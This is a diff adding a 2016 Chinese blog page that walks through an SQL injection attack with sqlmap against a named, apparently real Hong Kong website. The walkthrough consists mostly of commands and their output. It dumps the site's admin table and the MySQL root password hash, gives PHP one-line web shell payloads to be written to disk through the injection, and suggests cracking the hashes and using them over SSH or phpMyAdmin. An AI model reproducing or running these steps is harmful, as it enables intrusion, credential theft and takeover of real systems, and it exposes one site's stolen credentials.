@@ -1,0 +1,171 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql注入之sqlmap进行mysql注入root权限 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sql注入之sqlmap进行mysql注入root权限"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-05T10:32:52.000Z"><a href="/2016/07/05/sql注入之sqlmap进行mysql注入root权限/">2016-07-05</a></time>
+      
+      
+  
+    <h1 class="title">sql注入之sqlmap进行mysql注入root权限</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <hr>
+<p>#注解：#<br>1.在BT5 R2下 sqlmap安装路径为root@bt:/pentest/database/sqlmap#  也可以通过启动快捷方式启动sqlmap<br>root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> -f -b –current-user –current-db -v 1         * 获取当前用户和当前数据库<br>返回结果 :<br>[02:42:20] [INFO] fetching current user<br>current user:    ‘root@localhost’<br>[02:42:21] [INFO] fetching current database<br>current database:    ‘wepost’<br>这一句话命令代表的意思是：python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> -f -b –current-user –current-db -v 1</p>
+<h2 id="看结果可以也可以知道-当前用户为-root-当前数据库为-wepost"><a href="#看结果可以也可以知道-当前用户为-root-当前数据库为-wepost" class="headerlink" title="看结果可以也可以知道 当前用户为 root  当前数据库为 wepost"></a>看结果可以也可以知道 当前用户为 root  当前数据库为 wepost</h2><p>2.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a>  –dbs -v 2                                   <em> 获取所有数据库<br>返回结果 :<br>available databases [8]:<br>[</em>] bb<br>[<em>] cart<br>[</em>] information_schema<br>[<em>] mysql<br>[</em>] taipotour<br>[<em>] test<br>[</em>] wepost<br>[*] wepost2</p>
+<h2 id="看结果可以也可以知道-当前存在8个数据库"><a href="#看结果可以也可以知道-当前存在8个数据库" class="headerlink" title="* 看结果可以也可以知道 当前存在8个数据库"></a>* 看结果可以也可以知道 当前存在8个数据库</h2><p>3.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a>  –tables -D wepost -v 2                     /*获取wepost数据库（也就是当前数据库）的所有表名</p>
+<p>返回结果 :<br>Database: wepost<br>[6 tables]<br>+————-+<br>| admin       |<br>| article     |<br>| contributor |<br>| idea        |<br>| image       |<br>| issue       |<br>+————-+</p>
+<h2 id="看结果可以也可以知道-存在6个表"><a href="#看结果可以也可以知道-存在6个表" class="headerlink" title="看结果可以也可以知道   存在6个表"></a>看结果可以也可以知道   存在6个表</h2><p>4.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a>  –columns -D wepost -T admin -v 2     /*获取wepost数据库里admin表的字段<br>返回结果 :<br>Database: wepost<br>Table: admin<br>[4 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| id       | int(11)     |<br>| password | varchar(32) |<br>| type     | varchar(10) |<br>| userid   | varchar(20) |<br>+———-+————-+</p>
+<h2 id="看结果可以也可以知道-存在4个字段"><a href="#看结果可以也可以知道-存在4个字段" class="headerlink" title="看结果可以也可以知道   存在4个字段"></a>看结果可以也可以知道   存在4个字段</h2><p>5.root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> –dump  -D “wepost” -T “admin”  -C “userid,password”  -s “sqlnmapdb.log”<br>/*获取wepost数据库里 admin表里 userid和password字段里面的内容 并将数据保存下来 /pentest/database/sqlmap/output/www.wepost.com.hk<br>返回结果 :<br>Database: wepost<br>Table: admin<br>[1 entry]<br>+———————————-+————+<br>| password                         | userid     |<br>+———————————-+————+<br>| 7d4d7589db8b28e04db0982dd0e92189 | wepost2010 |<br>+———————————-+————+<br>[03:08:51] [INFO] Table ‘wepost.admin’ dumped to CSV file ‘/pentest/database/sqlmap/output/www.wepost.com.hk/dump/wepost/admin.csv’<br>[03:08:51] [INFO] Fetched data logged to text files under ‘/pentest/database/sqlmap/output/www.wepost.com.hk’<br>得到帐号密码| 7d4d7589db8b28e04db0982dd0e92189 | wepost2010 |<br>破MD5找后台去把<br>mysql既然是root权限 当然可以试着写shell或者读文件<br>（一般读都是读apache配置文件找网站路径 网站配置文件获取root密码尝试社工直接登录linux的ssh或者登录phpmyadmin登录执行sql语句写shell 或者读其他铭感信息）</p>
+<p>root权限写shell的3个条件：<br>1、知道站点物理路径<br>2、有足够大的权限（可以用select …. from mysql.user测试）<br>3、magic_quotes_gpc()=OFF<br>新版本的 php 已经将默认的值改为了 On 开启时</p>
+<p>当magic_quotes_gpc = On　时，它会将提交的变量中所有的 ‘(单引号)、”(双号号)、(反斜线)、空白字符，都为在前面自动加上 \ 进行转义<br>如何判断 :<br>1.工具穿山甲<br>2.and ‘1’=’1’<br>正常返回就是off，出错就是on<br>条件达到之后</p>
+<p>直接注入点后<br>方法1：<br><a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> select  ‘&lt;?php eval($_POST[cmd])?&gt;’   into outfile ‘物理路径’<br>方法2：<br><a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> and 1=2 union all select 一句话HEX值 into outfile ‘物理路径’<br>当magic_quotes_gpc = On　时 尝试读文件 读到root密码之后找phpmyadmin写shell  读linux用户<br>目标系统为2003的<br><a href="http://www.wepost.com.hk/article.php?id=276%20and%201=2%20union%20select" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276%20and%201=2%20union%20select</a> 1,2,3,4,5,@@datadir,7,8,9–<br>返回mysql路径 c:\wamp\bin\mysql\mysql5.1.36\data\mysql\user.MYD<br>补充完整的路径读取root密码</p>
+<p>6.root权限读文件<br>root@bt:/pentest/database/sqlmap# python sqlmap.py -u <a href="http://www.wepost.com.hk/article.php?id=276" target="_blank" rel="external">http://www.wepost.com.hk/article.php?id=276</a> –file-read “c:\wamp\bin\mysql\mysql5.1.36\data\mysql\user.MYD” -v 2<br>返回结果：<br>c:/wamp/bin/mysql/mysql5.1.36/data/mysql/user.MYD file saved to:    ‘/pentest/database/sqlmap/output/www.wepost.com.hk/files/c<strong>wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD’<br>[03:38:55] [INFO] Fetched data logged to text files under ‘/pentest/database/sqlmap/output/www.wepost.com.hk’<br>保存到了/pentest/database/sqlmap/output/www.wepost.com.hk/files/c</strong>wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD 这里了<br>root@bt:~# cd /pentest/database/sqlmap/output/www.wepost.com.hk/files/<br>root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# cat  c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD  </p>
+<h2 id="用cat查看得到的内容："><a href="#用cat查看得到的内容：" class="headerlink" title="用cat查看得到的内容："></a>用cat查看得到的内容：</h2><p>/ localhostroot/ 127.0.0.1root<br>                           %8DDA7DC67ED2CA2AD9V’h%<br>                                                                         worldgazers<em>6BB4837EB74329105EE456<br>X localhosthonoh</em>CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454root@bt:/</p>
+<hr>
+<p>用head查看到的内容：<br>root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# head c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD<br>/ localhostroot/ 127.0.0.1root<br>                           %8DDA7DC67ED2CA2AD9V’h%<br>                                                                         worldgazers<em>6BB4837EB74329105EE456<br>X localhosthonoh</em>CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# </p>
+<p>得到40位root密码  CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454 拿去解密 之后尝试社工 或者找phpmyadmin写shell</p>
+<hr>
+<p>6.file-write写入文件到web<br>sqlmap -u <a href="http://www.123.com/test.php?cid=2" target="_blank" rel="external">http://www.123.com/test.php?cid=2</a> –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2</p>
+<p>?</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/05/sql注入之sqlmap进行mysql注入root权限/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
